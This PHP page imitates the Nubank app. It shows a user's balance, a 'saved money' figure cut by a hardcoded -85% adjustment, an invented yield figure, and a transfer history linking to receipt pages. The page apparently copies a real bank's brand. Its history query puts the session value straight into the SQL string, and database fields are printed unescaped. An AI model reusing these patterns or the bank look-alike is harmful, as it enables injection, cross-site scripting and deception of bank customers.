<?php
session_start();
include 'conexaoatualizada.php'; // Inclua o arquivo de conexão

if (!isset($_SESSION['id'])) {
    header("refresh:0;url=login.php");
    exit;
}
include 'transferencias.php';

$porcentagem = -85;
// dinheiro guardado (% sobre o Dinheiro)
$porcentagem2 = 0.5;
// Lucro bruto
?>
<!DOCTYPE html>
<html><head>

  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="shortcut icon" href="imagens/icone.png" />
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <script>
  window.onload = function() {
    var valElement = document.getElementById("val");
    var a1Image = document.getElementById("a1Image");

    a1Image.addEventListener("click", function() {
      if (valElement.innerHTML === "<?php echo $saldo; ?>") {
        valElement.innerHTML = "••••";
        valElement.style.fontSize = "25px";
        valElement.style.letterSpacing = "2px"; // Adiciona espaçamento de 2 pixels entre os caracteres
      } else {
        valElement.innerHTML = "<?php echo $saldo; ?>";
        valElement.style.fontSize = "17px";
        valElement.style.letterSpacing = "normal"; // Remove o espaçamento entre os caracteres
      }
    });
  };
</script>
<script>

function changeImage(img) {
  var imagePath = img.src;
  var imageName = imagePath.substring(imagePath.lastIndexOf('/') + 1, imagePath.length);

  if (imageName === 'a1.png') {
    img.src = 'imagens/a0.png'; // Altere o caminho da imagem clicada
  } else {
    img.src = 'imagens/a1.png'; // Altere o caminho da imagem normal
  }
}
</script>
<title>Nubank</title>
<link rel="stylesheet" href="estilonu.css">
  <style type="text/css">
    body {
	text-align: center;
	margin: 0;
	padding: 0;
	font-family: "Graphik Medium";
	background-color: #FFF;
    }
.texto1 {
	font-size: 16px;
	color: #666;
	font-weight: normal;
    line-height: 1;
}

    img {
      max-width: 100%;
      height: auto;
    }
.botaoentrar {
	background-color: #8A02DB;
	cursor: pointer;
	text-align: center;
	margin: 0px;
	padding: 0px;
	width: 340px;
	font-size: 18px;
	background-position: center center;
	font-style: normal;
	height: 60px;
	border-radius: 50px;
	text-align: center;
	border: 1px none #FFF;
	color: #FFF;
}
  .fundoimagem tr td table tr td {
	background-image: url(03.png);
}
  .txt {
	font-size: 14px;
}
  .fundo {
	background-image: url(imagens/inicial.PNG);
	background-repeat: no-repeat;
	background-position: center top;
	background-size: 100%;
	
}
  .topo {
}
  .topotexto {
	font-size: 20px;
	color: #FFF;
}
  .bases {
}
.image-container {
  overflow-x: auto;
  white-space: nowrap;
}

.image-container img {
  display: inline-block;
  margin-right: 10px; /* Adicione um espaçamento entre as imagens */
}
  .fatura {
	font-size: 17px;
	color: #666;
}
  .limite {
	font-size: 13px;
	color: #797979;
}
  .linha {
	width: 100%;
	height: 1px;
	background-color: #EBEBEB;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
}
#divFixa {
	position: fixed;
	bottom: 2px; /* Ajuste o valor do espaçamento conforme necessário */
	width: 285px;
	left: 50%;
	transform: translateX(-50%);
	background-color: rgba(0, 0, 0, 0.0);
	opacity: 0.96;}

  .rendimento {
	color: #008029;
}
  .maisescuro {
	color: #333;
}
	.table-link {
  text-decoration: none;
  color: inherit;
}

  </style>
</head>
<body text="#666666" link="#666666" vlink="#666666" alink="#666666">
<table width="350" border="0" align="center">
  <tr>
    <td height="50" align="center"><table width="350" border="0">
      <tr>
        <td><a href="painel2.php"><img src="imagens/setay.png" alt="" width="34"></a></td>
        <td align="right"><img src="imagens/help.png" width="34"></td>
      </tr>
    </table></td>
  </tr>
</table>
<table width="100%" border="0">
  <tr>
    
  </tr>
</table>
<table width="350" border="0" align="center">
  <tr>
    <td><table width="350" border="0" align="center">
      <tr>
        <td height="30" align="left" valign="middle">&nbsp;</td>
      </tr>
      <tr>
        <td height="30" align="left" valign="middle"><span class="fatura">Saldo disponível</span></td>
      </tr>
      <tr>
        <td height="40" align="left"><span style="font-size: 36px; color: #333;"><?php
// Estabelecer conexão com o banco de dados
include 'conexaoatualizada.php';
try {
    $pdo = new PDO("mysql:host=$host;dbname=$banco", $usuario, $senhadb);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Consulta SQL
    $cpf = $_SESSION['cpf'];
    $sql = "SELECT saldo FROM usuarios WHERE cpf = :cpf";

    // Preparar a consulta
    $stmt = $pdo->prepare($sql);

    // Atribuir valor ao parâmetro :cpf
    $stmt->bindParam(':cpf', $cpf);

    // Executar a consulta
    $stmt->execute();

    // Obter o resultado da consulta
    $resultado = $stmt->fetch();

    // Exibir o valor do saldo
	
	if (is_array($resultado)) {
    $saldo = $resultado['saldo'];
} else {
    echo "0,00";
}
    echo "R$ " . number_format($saldo, 2, ',', '.');

} catch(PDOException $e) {
    echo "Erro ao conectar ao banco de dados: " . $e->getMessage();
}
?></span></td>
      </tr>
    </table></td>
  </tr>
</table>
<table width="350" border="0" align="center">
  <tr>
    <td><table width="350" border="0" align="center">
      <tr valign="middle">
        <td height="150" align="center"><table width="350" border="0">
          <tr>
            <td align="left">&nbsp;</td>
            <td align="left">&nbsp;</td>
            <td align="left">&nbsp;</td>
          </tr>
          <tr>
            <td width="12%" height="70" align="left"><span class="image-container"><a href="transferir.php"><img src="imagens/transferencias.png" width="28" height="51"></a></span></td>
            <td width="83%" align="left"><span class="icon4" style="color: #333; font-size: 17px;">Movimentações do mës</span></td>
            <td width="5%" align="left"><div align="right"><img src="imagens/seta.png" width="20"></div></td>
            </tr>
          <tr>
            <td height="70" align="left"><a href="transferir.php"><img src="imagens/poupanca.png" width="28" height="51"></a></td>
            <td align="left"><span class="icon4" style="color: #666; font-size: 17px; font-family: 'Circular Std Book';">Dinheiro guardado</span><br>
              <span class="icon3" style="color: #666; font-size: 17px; font-family: 'Graphik Medium';">
              
              R$ <span class="icon3" style="color: #666; font-size: 17px; font-family: 'Graphik Medium';">
              <?php 
			  $guardado1 = $saldo;
			  $guardado2 = $saldo;
			  
				$porcentagem_decimal = $porcentagem / 100; // Converter a porcentagem para decimal
				$valor_porcentagem = $saldo * $porcentagem_decimal; // Calcular o valor da porcentagem
				$valor_final = $saldo + $valor_porcentagem; // Adicionar o valor da porcentagem ao saldo
			  
			  $guardado = $valor_final;
			  ?>
              </span><?php echo number_format($valor_final, 2, ',', '.')?>
            </span></td>
            <td align="left"><div align="right"><img src="imagens/seta.png" width="20"></div></td>
          </tr>
          <tr>
            <td height="70" align="left"><a href="transferir.php"><img src="imagens/rendimentos.png" width="28" height="51"></a></td>
            <td align="left"><span class="icon4" style="color: #333; font-size: 17px;">Rendimento total da conta<br>
              </span><span class="rendimento"><span class="icon4" style="color: #333; font-size: 17px;"><span class="icon3" style="color: #666; font-size: 17px; font-family: 'Graphik Medium';">
              <?php 
			  
				$porcentagem_decimal = $porcentagem2 / 100; // Converter a porcentagem para decimal
				$valor_porcentagem2 = $guardado * $porcentagem_decimal; // Calcular o valor da porcentagem
			  
			  $comlucro = $valor_final + $valor_porcentagem2;
			  $lucrofinal = $comlucro - $valor_final;	  
			  
			  ?>
              </span></span><span class="icon3" style="color: #093; font-size: 17px; ">+R$ <?php echo number_format($lucrofinal, 2, ',', '.')?></strong></span><span class="icon4" style="color: #333; font-size: 17px;"> <span class="icon3" style="color: #666; font-size: 17px; font-family: 'Graphik Medium';"></span>este mes </span></td>
            <td align="left"><div align="right"><img src="imagens/seta.png" width="20"></div></td>
          </tr>
          </table></td>
      </tr>
    </table></td>
  </tr>
</table>
<table width="350" border="0" align="center">
  <tr>
    <td><table width="350" border="0" align="center">
      <tr valign="middle">
        <td height="150" align="center"><table width="350" border="0">
          <tr>
            <td height="160" align="center"><div class="image-container"> &nbsp; &nbsp;&nbsp;<a href="areapix.php"><img src="imagens/areapix.png" alt="50" width="75" height="240"></a>&nbsp;<img src="imagens/transferir.png" width="75" height="240"><img src="imagens/recarga.png" width="75" height="240"><img src="imagens/caixinhas.png" width="75" height="240"><img src="imagens/cobrar.png" width="75" height="240"><img src="imagens/doacoes.png" width="75" height="240"><img src="imagens/investir.png" width="75" height="240"><img src="imagens/transferinter.png" width="75" height="240">&nbsp;	&nbsp;&nbsp;&nbsp; </div></td>
            </tr>
          </table></td>
      </tr>
    </table></td>
  </tr>
</table>
<hr noshade="noshade" class="linha">
<table width="350" border="0" align="center">
  <tr>
    <td><table width="350" border="0" align="center">
      <tr>
        <td align="left">&nbsp;</td>
        <td align="center">&nbsp;</td>
      </tr>
      <tr>
        <td height="40" align="left"><img src="imagens/assistentepg.png" width="377"></td>
        <td align="center">&nbsp;</td>
      </tr>
    </table></td>
  </tr>
</table>
<table width="350" border="0" align="center">
  <tr>
    <td><table width="350" border="0" align="center">
      <tr>
        <td height="80" align="left"><span style="font-size: 22px; color: #333;">Histórico<br>
        </span></td>
        </tr>
      <tr>
        <td height="100" align="left"><img src="imagens/buscar.png" width="370"></td>
      </tr>
      <tr>
        <td align="left"><?php
// Estabeleça a conexão com o banco de dados
include 'conexaoatualizada.php';
$conn = new mysqli($host, $usuario, $senhadb, $banco);

// Verifique a conexão
if ($conn->connect_error) {
    die("Falha na conexão: " . $conn->connect_error);
}

$cpfx = $_SESSION['cpf'];

$sql = "SELECT * FROM transferencias 
        WHERE (oricpf = '$cpfx' AND tipo = 'enviada') 
           OR (destinocpf = '$cpfx' AND tipo = 'recebida') 
           OR (destinocpf = '$cpfx' AND tipo = 'Depósito') 
        ORDER BY id_trans DESC";
$result = $conn->query($sql);

// Verifique se há registros retornados
if ($result->num_rows > 0) {
    // Exiba os registros na tabela HTML
    while ($row = $result->fetch_assoc()) {
        ?>
        <a href="historiocovercomprovante.php?id=<?php echo $row['id_trans']?>" class="table-link">
        
        <table width="100%" border="0" align="center">
          <tr>
            <td width="18%" height="100" rowspan="2" align="left" valign="top">
              <?php
              $tipo = $row['tipo'];
              if ($tipo == 'enviada') {
                  echo '<img src="imagens/enviada.png" width="50">';
              } elseif ($tipo == 'recebida') {
                  echo '<img src="imagens/recebida.png" width="50">';
              } else {
                  echo '<img src="imagens/recebida.png" width="50">';
              }
              ?>
            </td>
            <td width="68%" align="left">
              <span class="icon4" style="font-size: 15px; color: #333; letter-spacing: -0.5px;"><strong>Transferencia 
              <?php
              if ($tipo == 'enviada') {
                  echo 'enviada';
              } elseif ($tipo == 'recebida') {
                  echo 'recebida';
              } else {
                  echo 'Depósito';
              }
              ?>
              </strong></span>
            </td>
            <td width="14%" rowspan="2" align="right" valign="top">
              <span class="icon4" style="font-size: 14px; color: #333;">
                <?php
                $dataAtual = date('d/m/Y');
                if ($row['data'] == $dataAtual) {
                    echo 'Hoje';
                } else {
                    $dataFormatada = date('d M', strtotime(str_replace('/', '-', $row['data'])));
                    echo $dataFormatada;
                }
                ?>
              </span>
            </td>
          </tr>
          <tr>
            <style>
              a { text-decoration: none; }
            </style>
            <td align="left">
              <span class="icon4" style="color: #666; font-size: 15px;">
                <?php
                if ($tipo == 'enviada') {
                    echo $row['destinonome'];
                } elseif ($tipo == 'recebida') {
                    echo $row['orinome'];
                } else {
                    echo $row['orinome'];
                }
                ?><br>
                R$
                <?php
                $valor = $row['valor'];
                $valorFormatado = number_format($valor, 2, ',', '.');
                echo $valorFormatado;
                ?><br>
<?php 
if ($row['tipodetransf'] == 'PIX') {
    echo 'PIX';
} elseif ($row['tipodetransf'] == 'TED') {
    echo 'TED';
}
?>
                <br>
              </span>
            </td>
          </tr>
          <tr valign="middle">
            <td height="25" colspan="3" align="left"><hr noshade="noshade" class="linha"></td>
          </tr>
        </table>
        </a>
        <?php
    }
} else {
    echo 'Nenhum registro encontrado.';
}

// Feche a conexão com o banco de dados
$conn->close();
?>

</td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
  </tr>
</table>
<hr noshade="noshade" class="linha">
</body>
</html>
